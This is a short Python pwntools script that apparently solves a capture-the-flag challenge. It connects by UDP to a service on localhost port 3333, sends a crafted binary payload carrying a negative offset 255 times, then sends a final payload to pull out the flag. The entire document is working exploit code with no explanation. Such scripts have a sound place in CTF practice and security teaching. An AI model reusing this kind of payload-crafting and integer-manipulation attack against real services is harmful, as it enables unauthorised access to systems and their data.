from pwn import *

payload_minus_8 = '\x0c\x00\x0d\x00\xf8\xff\xff\xff'
payload_get_flag = '\x0c\x00\x0d\x00\x09\x00\x00\x00'
ip_addr = "localhost"
udp_port = 3333

r = remote(ip_addr, int(udp_port), typ='udp')

for i in range(255):
    r.send(payload_minus_8)
    log.info(r.recvline())
    log.info(r.recvline())

r.send(payload_get_flag) # Final Payload!
log.info(r.recvline()) # Command Ack
log.info("Please be the Flag ==> {}".format(r.recvline().decode('utf-8')))

r.close()